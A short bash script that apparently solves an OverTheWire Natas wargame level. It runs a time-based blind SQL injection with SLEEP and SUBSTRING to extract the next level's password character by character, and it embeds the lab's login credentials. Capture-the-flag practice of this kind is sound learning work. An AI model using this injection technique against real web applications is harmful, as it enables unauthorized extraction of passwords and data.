#!/bin/bash

CHARS="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
PASS_LEN=32
URL="natas17.natas.labs.overthewire.org/index.php"
LOGIN="natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
PASS=""

for pos in $(seq 1 $PASS_LEN); do
	for char in $(echo $CHARS | fold -w1); do
	    SECONDS=0
		curl $URL -u $LOGIN -s -F "username=natas18\" AND IF(BINARY SUBSTRING(password,$pos,1)=\"$char\", SLEEP(5), 0) -- \"" > /dev/null
		if [ $SECONDS -ge 5 ]; then
			PASS+=$char
			echo "pass so far: $PASS"
			break
		fi
	done
done

echo "Password for natas18: $PASS"
	

